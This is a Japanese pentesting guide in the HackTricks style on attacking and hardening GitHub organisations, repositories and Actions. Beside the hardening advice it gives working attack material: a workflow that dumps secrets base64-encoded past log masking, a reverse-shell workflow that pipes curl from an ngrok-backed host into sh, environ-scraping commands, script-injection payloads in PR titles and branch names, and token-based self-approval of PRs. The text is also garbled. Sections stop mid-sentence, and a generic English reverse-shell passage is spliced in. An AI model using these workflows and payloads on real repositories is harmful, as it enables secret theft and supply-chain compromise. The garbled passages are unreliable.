# Githubセキュリティ

<details>

<summary><strong>HackTricksをサポートして特典を受け取る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**最新バージョンのPEASSを入手したい**場合、またはHackTricksをPDFでダウンロードしたい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。

</details>

## Githubとは

（[ここから](https://kinsta.com/knowledgebase/what-is-github/)）GitHubは、開発者がコードを保存し管理し、コードの変更を追跡および制御するのを支援するウェブサイトおよびクラウドベースのサービスです。

### 基本情報

{% content-ref url="basic-github-information.md" %}
[basic-github-information.md](basic-github-information.md)
{% endcontent-ref %}

## 外部リコン

Githubリポジトリは、公開、非公開、内部の3つの設定で構成できます。

* **非公開**は、**組織のメンバーのみ**がアクセスできることを意味します
* **内部**は、**企業のメンバーのみ**がアクセスできることを意味します（企業には複数の組織がある場合があります）
* **公開**は、**インターネット上の誰でも**アクセスできることを意味します。

**ユーザー、リポジトリ、または組織**をターゲットにする場合、**github dorks**を使用して機密情報を検索したり、**各リポジトリで機密情報の漏洩を検索**したりすることができます。

### Github Dorks

Githubでは、**ユーザー、リポジトリ、または組織**をスコープとして指定して検索することができます。したがって、機密情報に近い文字列のリストを使用して、ターゲットで潜在的な機密情報を簡単に検索できます。

ツール（各ツールにはdorksのリストが含まれています）：

* [https://github.com/obheda12/GitDorker](https://github.com/obheda12/GitDorker)（[Dorksリスト](https://github.com/obheda12/GitDorker/tree/master/Dorks)）
* [https://github.com/techgaun/github-dorks](https://github.com/techgaun/github-dorks)（[Dorksリスト](https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt)）
* [https://github.com/hisxo/gitGraber](https://github.com/hisxo/gitGraber)（[Dorksリスト](https://github.com/hisxo/gitGraber/tree/master/wordlists)）

### Githubの漏洩

Github dorksは、githubの検索オプションを使用して漏洩を検索するためにも使用されることに注意してください。このセクションは、各リポジトリをダウンロードし、それらの中で機密情報を検索するツールに捧げられています（コミットの特定の深さまでチェックも行います）。

ツール（各ツールには正規表現のリストが含まれています）：

* [https://github.com/zricethezav/gitleaks](https://github.com/zricethezav/gitleaks)
* [https://github.com/trufflesecurity/truffleHog](https://github.com/trufflesecurity/truffleHog)
* [https://github.com/eth0izzle/shhgit](https://github.com/eth0izzle/shhgit)
* [https://github.com/michenriksen/gitrob](https://github.com/michenriksen/gitrob)
* [https://github.com/anshumanbh/git-all-secrets](https://github.com/anshumanbh/git-all-secrets)
* [https://github.com/kootenpv/gittyleaks](https://github.com/kootenpv/gittyleaks)
* [https://github.com/awslabs/git-secrets](https://github.com/awslabs/git-secrets)

{% hint style="warning" %}
リポジトリで漏洩を探すときに`git log -p`などを実行することを忘れないでください。他のコミットを含む**他のブランチ**にも機密情報が含まれている可能性があることに注意してください！
{% endhint %}

### 外部フォーク

**プルリクエストを悪用してリポジトリを侵害する**ことができます。リポジトリが脆弱かどうかを知るためには、主にGithub Actionsのyaml設定を読む必要があります。[**以下で詳細に説明します**](./#execution-from-a-external-fork)。

## 組織の強化

### メンバーの権限

組織のメンバーには、いくつかの**デフォルトの権限**が割り当てられることがあります。これらは、ページ`https://github.com/organizations/<org_name>/settings/member_privileges`または[**Organizations API**](https://docs.github.com/en/rest/orgs/orgs)から制御できます。

* **基本権限**：メンバーは、組織のリポジトリに対してNone/Read/write/Adminの権限を持ちます。**None**または**Read**が推奨されます。
* **リポジトリのフォーク**：必要ない場合は、組織のリポジトリをメンバーがフォークできないようにする方が良いです。
* **ページの作成**：必要ない場合は、組織のリポジトリからページを公開することを許可しない方が良いです。必要な場合は、公開または非公開のページの作成を許可できます。
* **統合アクセスリクエスト**：これを有効にすると、外部の共同作業者がGitHubまたはOAuthアプリにアクセスするためにこの組織とそのリソースへのアクセスをリクエストできます。通常は必要ですが、必要ない場合は無効にする方が良いです。
* _APIのレスポンスにこの情報は見つかりませんでした。見つかった場合は共有してください_
* **リポジトリの可視性の変更**：有効にすると、**リポジトリ**の**管理者**権限を持つ**メンバー**が**可視性を変更**できます。無効にすると、組織の所有者のみがリポジトリの可視性を変更できます。**公開**にしたくない場合は、これが**無効**になっていることを確認してください。
* _APIのレスポンスにこの情報は見つかりませんでした。見つかった場合は共有してください_
* **リポジトリの削除と移動**：有効にすると、リポジトリの**管理者**権限を持つメンバーが公開および非公開のリポジトリを**削除**または**移動**できます。
* _APIのレスポンスにこの情報は見つかりませんでした。見つかった場合は共有してください_
* **メンバーがチームを作成できるようにする**：有効にすると、組織
### アクション設定

アクションのセキュリティ関連の設定は、`https://github.com/organizations/<org_name>/settings/actions` ページから設定することができます。

{% hint style="info" %}
これらの設定は、各リポジトリごとに独立して設定することもできます。
{% endhint %}

* **Githubアクションポリシー**: ワークフローを実行できるリポジトリと許可されるワークフローを指定することができます。すべてのアクションを実行するのではなく、**許可されるリポジトリ**を指定することが推奨されます。
* [**API-1**](https://docs.github.com/en/rest/actions/permissions#get-allowed-actions-and-reusable-workflows-for-an-organization)**,** [**API-2**](https://docs.github.com/en/rest/actions/permissions#list-selected-repositories-enabled-for-github-actions-in-an-organization)
* **外部コラボレーターからのフォークプルリクエストワークフロー**: **すべての**外部コラボレーターに承認を要求することを推奨します。
* _この情報を含むAPIが見つかりませんでした。見つけた場合は共有してください。_
* **フォークプルリクエストからのワークフローの実行**: ワークフローをプルリクエストから実行することは**強く推奨されません**。フォーク元のメンテナーは、ソースリポジトリの読み取り権限を持つトークンを使用する権限が与えられます。
* _この情報を含むAPIが見つかりませんでした。見つけた場合は共有してください。_
* **ワークフローの権限**: **読み取り専用のリポジトリ権限のみ**を与えることを強く推奨します。実行中のワークフローに与えられたGITHUB\_TOKENの乱用を防ぐため、書き込みおよびプルリクエストの作成/承認権限を与えることは推奨されません。
* [**API**](https://docs.github.com/en/rest/actions/permissions#get-default-workflow-permissions-for-an-organization)

### 統合

_この情報にアクセスするためのAPIエンドポイントがわかる場合は教えてください！_

* **サードパーティアプリケーションのアクセスポリシー**: すべてのアプリケーションへのアクセスを制限し、必要なもののみを許可することを推奨します（レビュー後）。
* **インストールされたGitHubアプリ**: 必要なもののみを許可することを推奨します（レビュー後）。

## 偵察と資格情報の悪用攻撃

このシナリオでは、GitHubアカウントへのアクセス権を取得したと仮定します。

### ユーザーの資格情報を使用する場合

組織内のユーザーの資格情報をすでに持っている場合、**ログイン**して、所属しているエンタープライズと組織の役割、自分が一般メンバーであるかどうか、一般メンバーに与えられる**権限**、所属している**グループ**、アクセス権を持つ**リポジトリ**、およびリポジトリの保護方法を確認できます。

**2FAが使用されている**場合、そのチェックをパスできる場合にのみ、この情報にアクセスできます。

{% hint style="info" %}
現在SameSite: Laxで構成されている`user_session`クッキーを**盗む**ことに成功した場合、資格情報や2FAなしでユーザーを**完全になりすます**ことができます。
{% endhint %}

必要な場合は、[**ブランチ保護の回避方法**](./#branch-protection-bypass)に関するセクションを確認してください。

### ユーザーのSSHキーを使用する場合

Githubでは、ユーザーが**SSHキー**を設定することができます。これは、ユーザー自身の代わりにコードをデプロイするための**認証方法**として使用されます（2FAは適用されません）。

このキーを使用すると、ユーザーに特権があるリポジトリで**変更を行う**ことができますが、github apiにアクセスして環境を列挙することはできません。ただし、アクセス権があるリポジトリとユーザーに関する情報を取得するために、**ローカル設定を列挙**することはできます。
```bash
# Go to the the repository folder
# Get repo config and current user name and email
git config --list
```
もしユーザーが自分のGitHubのユーザー名を設定している場合、彼のアカウントに設定されている**公開鍵にアクセス**することができます。これを確認することで、見つけた秘密鍵が使用できるかどうかを確認できます。

**SSH鍵**は、リポジトリに**デプロイ鍵**として設定することもできます。この鍵にアクセス権がある人は、リポジトリからプロジェクトを**起動**することができます。通常、異なるデプロイ鍵を持つサーバーでは、ローカルファイル**`~/.ssh/config`**に関連する鍵の情報が記載されています。

#### GPG鍵

[**こちら**](broken-reference/)で説明されているように、コミットに署名する必要がある場合や、発見される可能性があります。

現在のユーザーがローカルに鍵を持っているかどうかを確認してください。
```shell
gpg --list-secret-keys --keyid-format=long
```
### ユーザートークンを使用する場合

[**ユーザートークンに関する基本情報を確認する**](basic-github-information.md#personal-access-tokens)ための紹介を参照してください。

ユーザートークンは、Git over HTTPSのパスワードの代わりに使用することができます。または、[**Basic認証を介してAPIに認証するために使用**](https://docs.github.com/v3/auth/#basic-authentication)することもできます。それに関連付けられた特権に応じて、さまざまなアクションを実行することができる場合があります。

ユーザートークンは次のようになります：`ghp_EfHnQFcFHX6fGIu5mpduvRiYR584kK0dX123`

### OAuthアプリケーションを使用する場合

[**Github OAuthアプリケーションに関する基本情報を確認する**](basic-github-information.md#oauth-applications)ための紹介を参照してください。

攻撃者は、フィッシングキャンペーンの一環として、特権データ/アクションにアクセスするための**悪意のあるOAuthアプリケーション**を作成する可能性があります。

これらは、[OAuthアプリケーションが要求できるスコープ](https://docs.github.com/en/developers/apps/building-oauth-apps/scopes-for-oauth-apps)です。承認する前に要求されたスコープを常に確認する必要があります。

さらに、基本情報で説明されているように、**組織はサードパーティのアプリケーションに情報/リポジトリ/アクションへのアクセスを許可/拒否**することができます。

### Githubアプリケーションを使用する場合

[**Githubアプリケーションに関する基本情報を確認する**](basic-github-information.md#github-applications)ための紹介を参照してください。

攻撃者は、フィッシングキャンペーンの一環として、特権データ/アクションにアクセスするための**悪意のあるGithubアプリケーション**を作成する可能性があります。

さらに、基本情報で説明されているように、**組織はサードパーティのアプリケーションに情報/リポジトリ/アクションへのアクセスを許可/拒否**することができます。

## Githubアクションの悪用

[**Githubアクションに関する基本情報を確認する**](basic-github-information.md#github-actions)ための紹介を参照してください。

リポジトリで**任意のGithubアクションを実行**できる場合、そのリポジトリから**シークレットを盗む**ことができます。

### リポジトリの作成からの実行

組織のメンバーが**新しいリポジトリを作成**でき、Githubアクションを実行できる場合、**新しいリポジトリを作成し、組織レベルで設定されたシークレットを盗む**ことができます。

### 新しいブランチからの実行

既にGithubアクションが設定されているリポジトリで**新しいブランチを作成**できる場合、それを**変更**し、**コンテンツをアップロード**してから**新しいブランチからそのアクションを実行**することができます。これにより、リポジトリおよび組織レベルのシークレットを**外部に流出**させることができます（ただし、それらの名前を知っている必要があります）。

変更されたアクションを**手動で**実行したり、**PRが作成**されたり、**コードがプッシュ**されたりすると実行されます（どれくらい騒々しいかに応じて）。
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
### 外部フォークからの実行

リポジトリがgithub actionsを使用している場合、攻撃者はフォークされたリポジトリから**プルリクエストを作成**し、githubの**ワークフロー**に**悪意のあるコード**を注入することができ、その方法でgithubリポジトリを**危険にさらす**ことができます。

#### `pull_request`

ワークフロートリガー**`pull_request`**は、デフォルトでターゲットリポジトリへの**書き込み権限**と**シークレットへのアクセス**を防止します。さらに、デフォルトでは**初めて協力する場合**、いくつかの**メンテナ**がワークフローの**実行を承認**する必要があります。

<figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
デフォルトの制限は**初めての**貢献者に対してのみ適用されるため、有効なバグを修正してから新しい`pull_request`権限を悪用するために他のPRを送信することができます。

**これをテストしましたが、うまくいきませんでした**: ~~別のオプションとして、プロジェクトに貢献した人の名前でアカウントを作成し、そのアカウントを削除することが考えられます。~~
{% endhint %}

しかし、**`pull_request`**を介して**リポジトリの危険**を**防ぐ**ために、これは[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)で言及されています。

> `GITHUB_TOKEN`を除いて、**シークレットはフォークされたリポジトリからワークフローがトリガーされたときにランナーに渡されません**。**`GITHUB_TOKEN`は、フォークされたリポジトリからのプルリクエストで読み取り専用の権限**を持ちます。

攻撃者はGithub Actionの定義を変更して任意の処理を実行し、任意のアクションを追加することができます。ただし、上記の制限のため、シークレットを盗むことやリポジトリを上書きすることはできません。

ただし、アクションにアーティファクトがない場合でも、リポジトリのアーティファクトを変更してアクションを変更することができるかもしれません（TODO）。

{% hint style="danger" %}
**はい、攻撃者がPRでトリガーされるgithubアクションを変更すると、彼のGithubアクションが使用され、元のリポジトリのアクションは使用されません！**
{% endhint %}

_ただし、pull\_requestでトリガーされる新しいアクションはトリガーされません。_

#### **`pull_request_target`**

ただし、ワークフロートリガー**`pull_request_target`**は、ターゲットリポジトリに対して**書き込み権限**と**シークレットへのアクセス**を持ちます（許可を求める必要はありません）。

ワークフロートリガー**`pull_request_target`**は、**ベースのコンテキスト**で実行され、PRで与えられたコンテキストではないため、（信頼できないコードを実行しないように）注意が必要です。`pull_request_target`の詳細については、[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)を参照してください。\
また、この特定の危険な使用方法についての詳細については、この[**githubブログ記事**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)を参照してください。

**実行されるワークフロー**が**ベース**で定義されたものであり、PRではないため、**`pull_request_target`**を使用することは**安全**に見えるかもしれませんが、いくつかの**ケースではそうではありません**。

#### 攻撃者によるコントローラ変数を介したスクリプトの注入

Githubは[デフォルトの環境変数](https://docs.github.com/en/actions/learn-github-actions/environment-variables)を設定し、コンテキストが使用される場合は[それ以上の変数](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context)を含みます。これらの**値**がワークフロー内の**危険な場所**で使用され、攻撃者によって**制御される**可能性がある場合、**コマンドインジェクション**が発生する可能性があります。\
この脆弱性は、この記事の後半で[**詳しく説明されています**](./#understanding-the-risk-of-script-injections)。

#### 信頼できないなチェックアウトの実行

被害者がアクションをトリガーするために**`pull_request`**または同様のものを使用している場合、フォークからのPRは**明示的に承認されるまで**実行されません。その後、アクションは**PRのコンテキスト**で実行されます（PRのフォーク内のコードが実行されるため、良いことです）、ただし**最初に承認が必要**です。

被害者がチェックアウトを**`pull_request_target`**トリガーに明示的に設定した場合、常に**実行**されますが、ベースリポジトリのコード（PRのものではなく）が使用されるため、**攻撃者は実行されるコードを制御することはできません**。\
ただし、アクションに明示的なPRチェックアウトがある場合、PRのコード（ベースではなく）が使用されます。例えば（PRのコードがダウンロードされる行12を確認してください）。
```yaml
# INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
with:
ref: ${{ github.event.pull_request.head.sha }}

- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
```
潜在的な**信頼できないコードは、`npm install`または`npm build`の実行中に実行されます**。ビルドスクリプトと参照される**パッケージは、PRの作成者によって制御されます**。

{% hint style="danger" %}
セルフホストランナーでアクションが実行される場合、攻撃者は環境をさらに侵害する可能性があります。
{% endhint %}

脆弱なアクションを検索するためのGitHubのドークは、`event.pull_request pull_request_target extension:yml`です。ただし、アクションが安全でないように構成されていても、ジョブを安全に実行するさまざまな方法があります（PRを生成するアクターに関する条件分岐を使用するなど）。

### GitHubアクションのインジェクション/バックドア

何らかの方法で**GitHubアクション内に侵入**した場合、特権をエスカレートできれば、**シークレットが設定されたプロセスからシークレットを盗むことができます**。一部の場合では、特権をエスカレートする必要すらありません。
```bash
cat /proc/<proc_number>/environ
cat /proc/*/environ | grep -i secret #Suposing the env variable name contains "secret"
```
### Github Actionを介したAWSおよびGCPへのOIDCアクセス

以下のページを参照してください：

{% content-ref url="../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Github Actionsログにおける機密情報

**Github**はアクションのログ内で**秘密の値を検出**し、それらを表示しないようにしていますが、アクションの実行中に生成された**他の機密データ**は非表示にされません。たとえば、秘密の値で署名されたJWTは、[特に設定されていない限り](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)非表示にされません。

### GITHUB\_TOKEN

この「**シークレット**」（`${{ secrets.GITHUB_TOKEN }}`および`${{ github.token }}`から取得）は、管理者がこのオプションを有効にした場合に与えられます：

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

このトークンは、**Githubアプリケーションが使用する**ものと同じであり、次のエンドポイントにアクセスできます：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Githubは、[**フロー**](https://github.com/github/roadmap/issues/74)をリリースすべきです。これにより、リポジトリは`GITHUB_TOKEN`を使用して他の内部リポジトリにアクセスできます。
{% endhint %}

このトークンの可能な**権限**については、次のリンクを参照してください：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

このトークンは、ジョブが完了した後に**期限切れになります**。\
このトークンは次のようになります：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いことのいくつかは以下の通りです：
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'

# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'

# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% hint style="danger" %}
複数の場合において、Github Actionsの環境変数やシークレット内に**Githubユーザートークンを見つけることができる**ことに注意してください。これらのトークンは、リポジトリや組織に対してより多くの特権を与える可能性があります。
{% endhint %}

#### Github Actionsの出力でシークレットをリストアップする
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
#### シークレットを使用してリバースシェルを取得する

To get a reverse shell using secrets, follow these steps:

1. Identify the target system and gather information about it, such as the IP address and port number.
2. Generate a payload for the reverse shell. This payload will be used to establish a connection back to your machine.
3. Encrypt the payload using a secret key or password. This will help ensure that only authorized individuals can decrypt and execute the payload.
4. Transfer the encrypted payload to the target system. This can be done using various methods, such as uploading it to a compromised website or sending it via email.
5. On the target system, decrypt the payload using the secret key or password.
6. Execute the decrypted payload, which will establish a reverse shell connection back to your machine.
7. Once the reverse shell connection is established, you will have remote access to the target system's command line interface.

By following these steps, you can leverage secrets to obtain a reverse shell and gain remote access to a target system. However, it is important to note that unauthorized access to computer systems is illegal and unethical. Always ensure that you have proper authorization and legal permission before performing any penetration testing activities.
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
### スクリプトインジェクション <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

注意すべきなのは、一部の[**githubコンテキスト**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)の値が、PRを作成する**ユーザーによって制御**されることです。もしgithubアクションがそのデータを使用して**何かを実行する場合**、それは**任意のコードの実行**につながる可能性があります。これらのコンテキストは通常、`body`、`default_branch`、`email`、`head_ref`、`label`、`message`、`name`、`page_name`、`ref`、および`title`で終わります。例えば（この[**記事**](https://medium.com/tinder/exploiting-github-actions-on-open-source-projects-5d93936d189f)からのリスト）：

* github.event.comment.body
* github.event.issue.body
* github.event.issue.title
* github.head\_ref
* github.pull\_request.\*
* github.\*.\*.authors.name
* github.\*.\*.authors.email

また、ブランチ名やメールアドレスなど、**明らかでない潜在的に信頼できない入力元**もあります。これらは、許可される内容に関して**非常に柔軟**です。例えば、`zzz";echo${IFS}"hello";#`は有効なブランチ名であり、対象リポジトリの攻撃ベクトルとなり得ます。

#### スクリプトインジェクション攻撃の例 <a href="#example-of-a-script-injection-attack" id="example-of-a-script-injection-attack"></a>

スクリプトインジェクション攻撃は、ワークフローのインラインスクリプト内で直接発生することがあります。次の例では、アクションが**プルリクエストのタイトルの妥当性をテストするための式**を使用していますが、同時にスクリプトインジェクションのリスクも追加しています：
```yaml
- name: Check PR title
run: |
title="${{ github.event.pull_request.title }}"
if [[ $title =~ ^octocat ]]; then
echo "PR title starts with 'octocat'"
exit 0
else
echo "PR title did not start with 'octocat'"
exit 1
fi
```
シェルスクリプトが実行される前に、`${{ }}` 内の式が**評価**され、その結果の値で置換されます。これにより、シェルコマンドインジェクションの**脆弱性**が生じる可能性があります。

コマンドをこのワークフローにインジェクションするため、攻撃者はタイトルが `a"; ls $GITHUB_WORKSPACE"` であるプルリクエストを作成することができます:

![PRタイトルにおけるスクリプトインジェクションの例](https://docs.github.com/assets/cb-24920/images/help/images/example-script-injection-pr-title.png)

この例では、`"` 文字が `title="${{ github.event.pull_request.title }}"` ステートメントを中断し、`ls` コマンドをランナーで実行することを可能にしています。ログで `ls` コマンドの出力を確認できます:

![スクリプトインジェクションの例の結果](https://docs.github.com/assets/cb-28350/images/help/images/example-script-injection-result.png)

### シークレットへのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトにコンテンツをインジェクションする場合、シークレットにアクセスする方法を知ることが興味深いです:

* シークレットまたはトークンが**環境変数**に設定されている場合、**`printenv`** を使用して環境から直接アクセスできます。
* シークレットが**式で直接使用**される場合、生成されたシェルスクリプトは**ディスク上**に保存され、アクセス可能です。
* **カスタムアクション**の場合、プログラムが**引数**から取得したシークレットの使用方法によってリスクが異なります:

```
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### セルフホストランナーの悪用

**Github Actions が非-Github インフラストラクチャで実行**されているかどうかを見つける方法は、Github Action の設定 yaml で `runs-on: self-hosted` を検索することです。

**セルフホスト**ランナーは、**追加の機密情報**、他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイント？メタデータサービス？）にアクセスできる場合があります。また、**分離されて破棄されている場合でも、複数のアクションが同時に実行**される可能性があり、悪意のあるアクションが他のアクションのシークレットを**盗む**ことができます。

### キャッシュの改ざん

CI で [**action/cache**](https://github.com/actions/cache) Git アクションを使用すると、2つのステップが実行されます: 1つは呼び出されたときの**実行**プロセスで行われ、もう1つは**ワークフロー**の後で行われます（実行アクションがキャッシュミスを返した場合）。

* **実行アクション** - キャッシュを検索して取得するために使用されます。キャッシュキーを使用して検索が行われ、結果はキャッシュヒット（成功、キャッシュ内のデータが見つかった）またはキャッシュミスです。見つかった場合、ファイルとディレクトリはアクティブな使用のためにキャッシュから取得されます。結果がキャッシュミスの場合、必要なファイルとディレクトリは初めて呼び出されたかのようにダウンロードされます。
* **ワークフローアクション** - キャッシュを保存するために使用されます。実行アクションでのキャッシュ呼び出しの結果がキャッシュミスの場合、このアクションは提供されたキーでキャッシュしたいディレクトリの現在の状態を保存します。このアクションは自動的に行われ、明示的に呼び出す必要はありません。

**アクセス制限**により、異なるブランチ間に**論理的な境界**が作成され、キャッシュの分離とセキュリティが提供されます（たとえば、ベースが main のブランチ **Feature-A** のために作成されたキャッシュは、ベースが main のブランチ **Feature-B** のプルリクエストからアクセスできません）。

キャッシュアクションは、まずキャッシュヒットを現在のブランチで検索し、ワークフローランのブランチにキーを復元します。現在のブランチにヒットがない場合、キャッシュアクションは親ブランチと上流ブランチでキーを検索し、キーを復元します。

キャッシュへのアクセスはブランチ（現在のブランチと親ブランチ）でスコープが設定されており、そのブランチの**ワークフロー**全体にわたって**実行**されるすべてのワークフローにアクセスが提供されます。

もう1つ重要なポイントは、GitHub ではエントリがプッシュされた後に変更を許可しないことです - キャッシュエントリは読み取り専用のレコードです。

私たちは、2つのワークフローを含む例の CI を使用しました。この例では、攻撃者が低い権限のワークフローから高い権限のワークフローに移行する攻撃方法を示しています。

* **ユニットテスト**ワークフローは、ユニットテストとコードカバレッジツールを実行します。ツールの1つが悪意のあるコードまたはリモートコード実行の脆弱性を持つと仮定します。このワークフローは**action/cache** Git アクションを使用する必要はありません。どのワークフローでもキャッシュにアクセスできます。
* **リリース**ワークフローはアプリケーションのアーティファクトをビルドしてリリースします。このワークフローは Golang の依存関係を最適化するためにキャッシュを使用します。

**ユニットテスト**ワークフローは、悪意のあるアクションを使用してキャッシュエントリを追加し、Golang のロギングライブラリ（**go.uber.org/zap@v1**）を変更してアプリケーションアーティファクトの説明に文字列「BAD library」を追加します。

次に、**リリース**ワークフローはこの改ざんされたキャッシュエントリを使用します。その結果、悪意のあるコードがビルドされた Golang バイナリとイメージに注入されます。キャッシュはエントリキーが破棄されるまで改ざんされたままです（通常は依存関係の更新によってトリガされます）。同じ改ざんされたキャッシュは、同じキャッシュキーを使用する他の**ワークフロー**、**実行**、**子ブランチ**に影響を与えます。

私たちが行ったテストでは、文字列「BAD library」をイメージの説明に注入することに成功しました:

![BAD library](https://scribesecurity.com/wp-content/uploads/2022/02/BAD-library-2-300x79.jpg)

これはバージョン0.4.1でのものです。次に、タグを更新してイメージを複数回再ビルドしましたが、「Bad library」
### 削除されたネームスペースリポジトリの乗っ取り

これは、削除されたネームスペースを盗むことで有名なリポジトリを盗むことができる脆弱性についての良いブログ記事です（ネームスペースの名前変更のために可能性があります）：[https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

### Github Dockerイメージレジストリ

Githubアクションを使用して、**DockerイメージをビルドしてGithub内に保存する**ことができます。\
以下の展開可能なセクションに例があります：

<details>

<summary>GithubアクションでDockerイメージをビルドしてプッシュする</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

以前のコードでわかるように、Githubのレジストリは**`ghcr.io`**にホストされています。

リポジトリに読み取り権限を持つユーザーは、パーソナルアクセストークンを使用してDockerイメージをダウンロードすることができます。
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
次に、ユーザーは**Dockerイメージのレイヤーで漏洩した秘密情報を検索**することができます。

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

## ブランチ保護のバイパス

* **承認の数を要求する**: 複数のアカウントを侵害した場合、他のアカウントから自分のPRを承認することができます。PRを作成したアカウントしか持っていない場合、自分自身のPRを承認することはできません。ただし、リポジトリ内の**Github Action**環境にアクセスできる場合、**GITHUB\_TOKEN**を使用して自分のPRを**承認**し、この方法で1つの承認を得ることができるかもしれません。
* _この方法とCode Ownersの制限について注意しておくと、通常、ユーザーは自分自身のPRを承認することはできませんが、自分自身のPRを承認するために悪用することができます。_
* **新しいコミットがプッシュされると承認を無効にする**: これが設定されていない場合、正当なコードを提出し、誰かが承認するのを待ってから、悪意のあるコードを追加して保護されたブランチにマージすることができます。
* **Code Ownersからのレビューを要求する**: これが有効になっていてCode Ownersである場合、**Github Actionが自分のPRを作成し、それを自分自身で承認**することができます。
* **CODEOWNERファイルが誤って設定されている**場合、Githubはエラーを表示しませんが、それを使用しません。したがって、誤って設定されている場合、**Code Ownersの保護は適用されません**。
